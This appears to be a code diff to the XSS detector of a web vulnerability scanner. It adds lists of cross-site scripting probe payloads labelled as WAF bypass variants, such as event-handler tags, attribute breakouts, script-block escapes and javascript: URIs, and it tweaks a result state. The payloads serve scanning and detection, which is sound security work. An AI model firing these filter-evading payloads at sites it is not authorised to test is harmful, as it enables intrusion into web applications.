@@ -28,33 +28,53 @@ from ..models.endpoint import EndpointInfo
 # Context detection patterns
 CONTEXT_PATTERNS = {
     "html_tag": re.compile(r'<[^>]*{CANARY}[^>]*>', re.IGNORECASE),
-    "html_attribute": re.compile(r'([\w-]+)\s*=\s*["\'][^"\']*{CANARY}[^"\']*["\']', re.IGNORECASE),
+    "html_attribute": re.compile(r'([\w-]+)\s*=\s*["\'"][^"\']*{CANARY}[^"\']*["\']', re.IGNORECASE),
     "script_block": re.compile(r'<script[^>]*>[^<]*{CANARY}[^<]*</script>', re.IGNORECASE | re.DOTALL),
     "html_comment": re.compile(r'<!--[^>]*{CANARY}[^>]*-->', re.IGNORECASE),
-    "js_string": re.compile(r'["\'][^"\']*{CANARY}[^"\']*["\']', re.IGNORECASE),
+    "js_string": re.compile(r'["\'"][^"\']*{CANARY}[^"\']*["\']', re.IGNORECASE),
 }
 
-# Context-specific payloads
+# Context-specific payloads (including WAF bypass variants)
 CONTEXT_PAYLOADS = {
     "html_body": [
         '<img src=x onerror=alert(1)>',
         '<svg onload=alert(1)>',
         '<details open ontoggle=alert(1)>',
+        # WAF bypass variants
+        '<img src=x onerror=alert`1`>',
+        '<svg/onload=alert(1)>',
+        '<img src=x onerror="alert(1)">',
+        '<body onload=alert(1)>',
+        '<input autofocus onfocus=alert(1)>',
+        '<marquee onstart=alert(1)>',
     ],
     "html_attribute": [
         '" onmouseover="alert(1)" x="',
         "' onfocus='alert(1)' autofocus='",
         '" autofocus onfocus="alert(1)',
+        # WAF bypass variants
+        '" onmouseenter="alert(1)',
+        "' onpointerenter='alert(1)'",
+        '" tabindex=1 onfocus="alert(1)',
     ],
     "script_block": [
         "';alert(1);//",
         '";alert(1);//',
         "</script><script>alert(1)</script>",
+        # WAF bypass
+        "';alert`1`;//",
+        "\\';alert(1);//",
+        "\\x27;alert(1);//",
     ],
     "generic": [
         "<script>alert(1)</script>",
         '"><script>alert(1)</script>',
         "<img src=x onerror=alert(1)>",
+        # WAF bypass generic
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<svg><script>alert(1)</script></svg>",
+        "javascript:alert(1)",
+        '<iframe src="javascript:alert(1)">',
     ],
 }
 
@@ -108,8 +128,8 @@ class XSSDetector(BaseDetector):
         testable = [ep for ep in endpoints if ep.all_params]
         if not testable:
             return DetectorResult(
-                test_state=TestState.NOT_APPLICABLE,
-                details="No endpoints with injectable parameters found"
+                test_state=TestState.NOT_TESTED,
+                details="No endpoints with injectable parameters found — run with --js flag for SPA crawling"
             )
 
         for ep in testable:
